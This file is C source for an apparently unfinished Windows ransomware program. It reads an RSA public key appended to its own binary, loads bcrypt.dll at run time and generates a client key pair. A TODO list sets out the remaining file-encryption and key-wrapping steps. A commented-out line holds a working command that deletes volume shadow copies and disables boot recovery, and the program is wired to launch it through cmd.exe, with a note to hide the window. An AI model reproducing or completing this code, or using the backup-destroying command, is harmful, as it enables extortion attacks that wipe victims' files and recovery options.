#include <windows.h>

#include "util.h"
#include "crypt.h"

//#define RM_SHADOW_BACKUPS "/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default} recoveryenabled No & bcdedit /set {default} bootstatuspolicy ignoreallfailures"
#define RM_SHADOW_BACKUPS	"/c pause"

#define SIZEOF_ARRAY(arr)	(sizeof(arr) / sizeof(arr[0]))

char *
ftok(char *self, HINSTANCE *hinst)
{
	FILE *f;
	HRSRC rs;
	HGLOBAL grs;
	BCRYPT_ALG_HANDLE alghandle;
	BCRYPT_KEY_HANDLE hkey;
	unsigned long pubkeysize;
	char *pubkey;
	/* Read the key size */
	if (!(f = fopen(self, "rb")))
		die("Failed to open self");
	if (fseek(f, -sizeof(unsigned), SEEK_END))
		die("Failed to fseek self");
	if (fread(&pubkeysize, 1, sizeof(unsigned), f) != sizeof(unsigned))
		die("Failed to fread pubkey");
	/* malloc key */
	if (!(pubkey = malloc(pubkeysize)))
		die("Failed to malloc pubkey");
	/* Read the key, SEEK_CUR -> skip last 4 bytes sizeof(unsigned) */
	if (fseek(f, -(pubkeysize + sizeof(unsigned)), SEEK_CUR))
		die("Failed to fseek self");
	if (fread(pubkey, 1, pubkeysize, f) != pubkeysize)
		die("Failed to fread pubkey");
	fclose(f);
	/* BCryptOpenAlgorithmProvider */
	if (adrof(*hinst, "BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
		die("Failed to call BCryptOpenAlgorithmProvider");
	/* BCryptImportKeyPair */
	if (adrof(*hinst, "BCryptImportKeyPair")(alghandle, 0, BCRYPT_RSAPUBLIC_BLOB, &hkey, pubkey, pubkeysize, 0))
		die("Failed to BCryptImportKeyPair");
	/* BCryptCloseAlgorithmProvider */
	adrof(*hinst, "BCryptCloseAlgorithmProvider")(alghandle, 0);

	return hkey;
}

int
main(int argc, char **argv)
{
	/* TODO:
	 * [X] Read RSA pubkey
	 * [X] Remove shadow backups
	 * [X] dynamically load crypt32.dll | https://docs.microsoft.com/en-us/windows/win32/dlls/using-run-time-dynamic-linking
	 * [X] Generate Client RSA key pair
	 * [] Encrypt Client RSA privkey with Server RSA pubkey
	 * [] Remove Client RSA privkey
	 * [] Generate AES key
	 * [] Encrypt file with AES
	 * [] Encrypt AES key with Client pubkey
	 * [] Remove AES key
	 * [] Save encrypted AES key
	*/
	HINSTANCE hinst;
	BCRYPT_KEY_HANDLE skey, ckey;
	BCRYPT_ALG_HANDLE alghandle;

	if (!(hinst = LoadLibrary("bcrypt.dll")))
		die("Failed to load bcrypt.dll");

	skey = ftok(argv[0], &hinst);

	ShellExecute(NULL, "open", "cmd.exe", RM_SHADOW_BACKUPS, NULL, SW_SHOW); /* TODO: Change to SW_HIDE */

	/* Gen RSA keypair */
	/* BCryptOpenAlgorithmProvider */
	if (adrof(hinst,"BCryptOpenAlgorithmProvider")(&alghandle, BCRYPT_RSA_ALGORITHM, 0, 0))
			die("Failed call to BCryptOpenAlgorithmProvider");
	/* BCryptGenerateKeyPair */
	if (adrof(hinst, "BCryptGenerateKeyPair")(alghandle, &ckey, 2048, 0))
			die("Failed call to BCryptGenerateKeyPair");
	/* BCryptFinalizeKeyPair */
	if (adrof(hinst, "BCryptFinalizeKeyPair")(ckey, 0))
			die("Failed call to BCryptFinalizeKeyPair");


	/* BCryptDestroyKey */
	adrof(hinst, "BCryptDestroyKey")(skey);
	adrof(hinst, "BCryptDestroyKey")(ckey);
	FreeLibrary(hinst);
	return 0;
}

